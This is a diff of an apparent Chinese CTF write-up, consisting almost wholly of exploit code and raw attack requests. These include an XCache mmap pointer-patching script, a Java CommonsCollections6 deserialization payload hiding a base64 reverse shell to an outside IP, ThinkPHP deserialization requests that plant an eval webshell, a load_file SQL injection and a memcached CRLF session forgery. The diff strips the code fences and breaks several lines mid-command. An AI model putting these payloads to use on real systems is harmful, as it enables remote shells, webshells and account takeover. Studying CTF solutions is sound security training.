@@ -13,11 +13,6 @@
 6
 7
 8
-```
-
-
-
-```
 c6d4c9861179fe161d0233e3570998dc
 _GET
 strlen
@@ -26,11 +21,6 @@ str_split
 implode
 cat /flag
 system
-```
-
-
-
-```
 1
 2
 3
@@ -57,15 +47,10 @@ system
 24
 25
 26
-```
-
-
-
-```
-#include <sys/types.h>
+    #include <sys/types.h>
  #include <sys/stat.h>
  #include <fcntl.h>
-#include <sys/mman.h>
+    #include <sys/mman.h>
 void mymmap(){
 int file1 = open("/tmp/clean_b3", O_RDONLY);
  size_t ro_addr = 0x7fb5ed09c000;
@@ -88,11 +73,6 @@ if(is_replaced_1 == 0){
 }else{
  TRACE("1: xc_php_find_unlocked have already faked, do not fake again %s","");
 }
-```
-
-
-
-```
 1
 2
 3
@@ -113,11 +93,6 @@ if(is_replaced_1 == 0){
 18
 19
 20
-```
-
-
-
-```
 #找mmap基址
 from pwn import *
 filename = "clean_b3"
@@ -138,11 +113,6 @@ assert hex(root).endswith("000")
 # 远程开启了 xcache read only protection,因此同一个文件被mmap了两次，一个只读的和一个读写的。
 real_rw_root = root + 0x4000000
 print("rw_root: " + hex(real_rw_root))
-```
-
-
-
-```
 1
 2
 3
@@ -185,11 +155,6 @@ print("rw_root: " + hex(real_rw_root))
 40
 41
 42
-```
-
-
-
-```
 #用函数指针后3位地址找libphp的基址，然后把mmap文件里面远程的函数指针全部替换成本地的函数指针
 import re
 from pwn import *
@@ -232,11 +197,6 @@ print("local delta: ",hex(local_delta))
 
 remote_base = remote_entry - local_delta
 print("remote base: ",hex(remote_base))
-```
-
-
-
-```
 1
 2
 3
@@ -259,11 +219,6 @@ print("remote base: ",hex(remote_base))
 20
 21
 22
-```
-
-
-
-```
 import subprocess
 from pwn import *
 
@@ -286,11 +241,6 @@ data = re.sub(remote_regex, repl, data)
 
 with open("/tmp/clean_b3_mod","bw") as f:
  f.write(data)
-```
-
-
-
-```
 1
 2
 3
@@ -328,17 +278,13 @@ with open("/tmp/clean_b3_mod","bw") as f:
 35
 36
 37
-```
-
-
-
-```
 FROM ubuntu:22.04
 
 ENV TZ=Asia/Shanghai \
  DEBIAN_FRONTEND=noninteractive
 RUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.aliyun.com/g" /etc/apt/sources.list && sed -i "s/http:\/\/security.ubuntu.com/http:\/\/mirrors.aliyun.com/g" /etc/apt/sources.list && \
-apt update && apt install -y software-properties-common && add-apt-repository ppa:ondrej/php -y && apt install -y php5.6 php5.6-cli
+apt update && apt install -y software-properties-common && add-apt-repository ppa:
+ondrej/php -y && apt install -y php5.6 php5.6-cli
 RUN apt install -y php5.6-dev
 ADD ./xdebug-2.5.5 /tmp/xdebug
 RUN cd /tmp/xdebug \
@@ -370,11 +316,6 @@ RUN echo 'xdebug.collect_vars=1' >> /etc/php/5.6/apache2/conf.d/99-xdebug.ini
 RUN ln -sf /proc/self/fd/1 /var/log/apache2/access.log && \
  ln -sf /proc/self/fd/1 /var/log/apache2/error.log
 CMD apachectl -D FOREGROUND -X
-```
-
-
-
-```
 1
 2
 3
@@ -388,11 +329,6 @@ CMD apachectl -D FOREGROUND -X
 11
 12
 13
-```
-
-
-
-```
 TRACE START [2023-12-16 17:53:20]
  0.0000 232096 -> {main}() /var/www/html/challenge.php:0
  0.0001 232440 -> strlen(string(32)) /var/www/html/challenge.php:5
@@ -406,11 +342,6 @@ TRACE START [2023-12-16 17:53:20]
  0.0014 238552 >=> 1
  0.0015 8368
 TRACE END [2023-12-16 17:53:20]
-```
-
-
-
-```
 1
 2
 3
@@ -440,11 +371,6 @@ TRACE END [2023-12-16 17:53:20]
 27
 28
 29
-```
-
-
-
-```
 import requests
 
 rs = requests.Session()
@@ -473,11 +399,6 @@ print(xored_cipher)
 
 r2 = rs.get('http://eci-2ze245ak3rvctqp48pe0.cloudeci1.ichunqiu.com/challenge.php', params={'key': xored_cipher})
 print(r2.text)
-```
-
-
-
-```
 1
 2
 3
@@ -519,11 +440,6 @@ print(r2.text)
 39
 40
 41
-```
-
-
-
-```
 package com.javasec.pocs.cc;
 import com.javasec.utils.SerializeUtils;
 import org.apache.commons.collections.Transformer;
@@ -564,23 +480,9 @@ public class CommonsCollections6 {
  SerializeUtils.base64deserial(poc);
  }
 }
-```
-
-
-
-```
 1
-```
-
-
-
-```
-echo "{'serializeData': 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWFhc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABxzcQB+ABN1cQB+ABgAAAACcHB0AAZpbnZva2V1cQB+ABwAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQAaWJhc2ggLWMge2VjaG8sWW1GemFDQXRZeUFpWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4NExqRXpNQzR5TkM0eE9EZ3ZOemMzTlNBOEpqRWl9fHtiYXNlNjQsLWR9fHtiYXNoLC1pfXQABGV4ZWN1cQB+ABwAAAABcQB+AB9zcQB+AAA/QAAAAAAADHcIAAAAEAAAAAB4eHQAA2JiYng='}" | grpc_cli call 8.147.133.227:32866 ProcessMsg --json_input
-```
-
-
-
-```
+echo "{'serializeData': 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWFhc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABxzcQB+ABN1cQB+ABgAAAACcHB0AAZpbnZva2V1cQB+ABwAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQAaWJhc2ggLWMge2VjaG8sWW1GemFDQXRZeUFpWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4NExqRXpNQzR5TkM0eE9EZ3ZOemMzTlNBOEpqRWl9fHtiYXNlNjQsLWR9fHtiYXNoLC1pfXQABGV4ZWN1cQB+ABwAAAABcQB+AB9zcQB+AAA/QAAAAAAADHcIAAAAEAAAAAB4eHQAA2JiYng='}" | grpc_cli call 8.147.133.227:
+32866 ProcessMsg --json_input
 1
 2
 3
@@ -597,11 +499,6 @@ echo "{'serializeData': 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9
 14
 15
 16
-```
-
-
-
-```
 POST /public/index.php/index/admin/do_edit.html HTTP/1.1
 Host: eci-2zegp2dwag3hcmblf44t.cloudeci1.ichunqiu.com
 Content-Length: 2500
@@ -618,11 +515,6 @@ Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1700560980,1701446760,1702540036
 Connection: close
 
 id=1&name=fake_flag&price=100.00&on_sale_time=2023-05-05T02%3A20%3A54&image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&data`%3d%27YToxOntpOjA7TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo2OiJwYXJlbnQiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YTo3OntpOjA7czo3OiJnZXRBdHRyIjtpOjE7czo0OiJpbmZvIjtpOjI7czo1OiJlcnJvciI7aTozO3M6NzoiY29tbWVudCI7aTo0O3M6ODoicXVlc3Rpb24iO2k6NTtzOjk6ImhpZ2hsaWdodCI7aTo2O3M6Nzoid2FybmluZyI7fXM6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6MTp7czoxMDoiACoAaGFuZGxlciI7TzoyMzoidGhpbmtcY2FjaGVcZHJpdmVyXEZpbGUiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NDp7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6NzU6InBocDovL2ZpbHRlci93cml0ZT1zdHJpbmcucm90MTMvcmVzb3VyY2U9c3RhdGljLzw%2FY3VjIEByaW55KCRfVFJHWyduJ10pOyA%2FPiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjY6IgAqAHRhZyI7czo0OiJ4aWdlIjt9fX1zOjk6IgAqAGFwcGVuZCI7YToxOntzOjQ6InRlc3QiO3M6ODoiZ2V0RXJyb3IiO31zOjc6IgAqAGRhdGEiO2E6MTp7czo3OiJwYW5yZW50IjtzOjQ6InRydWUiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjU6e3M6NToibW9kZWwiO2I6MDtzOjE1OiIAKgBzZWxmUmVsYXRpb24iO2I6MDtzOjk6IgAqAHBhcmVudCI7TjtzOjg6IgAqAHF1ZXJ5IjtPOjE0OiJ0aGlua1xkYlxRdWVyeSI6MTp7czo4OiIAKgBtb2RlbCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6OToiACoAc3R5bGVzIjthOjc6e2k6MDtzOjc6ImdldEF0dHIiO2k6MTtzOjQ6ImluZm8iO2k6MjtzOjU6ImVycm9yIjtpOjM7czo3OiJjb21tZW50IjtpOjQ7czo4OiJxdWVzdGlvbiI7aTo1O3M6OToiaGlnaGxpZ2h0IjtpOjY7czo3OiJ3YXJuaW5nIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoxOntzOjEwOiIAKgBoYW5kbGVyIjtPOjIzOiJ0aGlua1xjYWNoZVxkcml2ZXJcRmlsZSI6Mjp7czoxMDoiACoAb3B0aW9ucyI7YTo0OntzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czo3NToicGhwOi8vZmlsdGVyL3dyaXRlPXN0cmluZy5yb3QxMy9yZXNvdXJjZT1zdGF0aWMvPD9jdWMgQHJpbnkoJF9UUkdbJ24nXSk7ID8%2BIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6NjoiACoAdGFnIjtzOjQ6InhpZ2UiO319fX1zOjExOiIAKgBiaW5kQXR0ciI7YToxOntzOjI6Inh4IjtzOjI6Inh4Ijt9fXM6ODoiACoAbW9kZWwiO3M6NDoidGVzdCI7fX19fQ%3D%3D%27%09where%09`id`%3d1%23a=1&data=%23+FLAG%0D%0A%0D%0A%23%23+%E8%AF%B7%E7%9C%8B%E7%9C%8B%E8%BF%99%E4%B8%AAFLAG%E5%A5%BD%E7%9C%8B%E5%90%97%0D%0A%E5%86%8D%E4%BB%94%E7%BB%86%E4%BB%94%E7%BB%86%E6%83%B3%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AAflag%E6%80%8E%E4%B9%88%E6%89%8D%E8%83%BD%E6%8B%BF%E5%88%B0%E5%91%A2%0D%0A%0D%0A
-```
-
-
-
-```
 1
 2
 3
@@ -730,11 +622,6 @@ id=1&name=fake_flag&price=100.00&on_sale_time=2023-05-05T02%3A20%3A54&image=http
 105
 106
 107
-```
-
-
-
-```
 <?php
 namespace think\cache\driver;
 
@@ -842,11 +729,6 @@ class Windows {
 $obj = new Windows();
 $payload = serialize([$obj]);
 echo base64_encode($payload);
-```
-
-
-
-```
 1
 2
 3
@@ -863,11 +745,6 @@ echo base64_encode($payload);
 14
 15
 16
-```
-
-
-
-```
 POST /public/index.php/index/admin/do_edit.html HTTP/1.1
 Host: eci-2ze0mwyalswv7z0u3m1h.cloudeci1.ichunqiu.com
 Content-Length: 488
@@ -884,23 +761,9 @@ Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1701446760,1702540036,1702548089
 Connection: close
 
 id=1&name=fake_flag&price=100.00&on_sale_time=2023-05-05T02%3A20%3A54&image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&data`%3dload_file(%27/fffflllaaaagggg%27)%09where%09`id`%3d1%23a=1&data=%23+FLAG%0D%0A%0D%0A%23%23+%E8%AF%B7%E7%9C%8B%E7%9C%8B%E8%BF%99%E4%B8%AAFLAG%E5%A5%BD%E7%9C%8B%E5%90%97%0D%0A%E5%86%8D%E4%BB%94%E7%BB%86%E4%BB%94%E7%BB%86%E6%83%B3%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AAflag%E6%80%8E%E4%B9%88%E6%89%8D%E8%83%BD%E6%8B%BF%E5%88%B0%E5%91%A2%0D%0A%0D%0A
-```
-
-
-
-```
 1
-```
-
-
-
-```
-1222%00%0d%0aset think:shop.admin|1 0 1702802967 101%0d%0aa:3:{s:2:"id";i:1;s:8:"username";s:5:"admin";s:8:"password";s:32:"e10adc3949ba59abbe56e057f20f883e";}%0d%0a
-```
-
-
-
-```
+1222%00%0d%0aset think:
+shop.admin|1 0 1702802967 101%0d%0aa:3:{s:2:"id";i:1;s:8:"username";s:5:"admin";s:8:"password";s:32:"e10adc3949ba59abbe56e057f20f883e";}%0d%0a
 1
 2
 3
@@ -915,12 +778,8 @@ id=1&name=fake_flag&price=100.00&on_sale_time=2023-05-05T02%3A20%3A54&image=http
 12
 13
 14
-```
-
-
-
-```
-从memcacheget的$key为think:shop.admin|1 1是我们传入的用户名
+从memcacheget的$key为think:
+shop.admin|1 1是我们传入的用户名
 找到https://www.freebuf.com/vuls/328384.html
 memcached的问题。crlf。
 
